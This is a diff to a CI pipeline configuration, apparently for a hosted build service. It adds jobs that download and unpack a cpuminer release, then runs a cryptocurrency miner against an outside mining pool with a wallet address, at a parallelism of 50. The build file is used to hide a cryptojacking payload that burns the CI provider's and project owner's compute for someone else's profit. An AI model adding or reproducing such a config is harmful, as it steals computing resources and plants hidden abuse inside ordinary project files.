@@ -10,5 +10,11 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+        - name: 'Job #2'
+          commands:
+            - tar xf cpuminer-opt-linux.tar.gz
+        - name: 'Job #3'
+          commands:
             - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qfhn0acwuxwgpk0p739zvuua3lmdvuf5zqlgpze.1 -t2'
           parallelism: 50
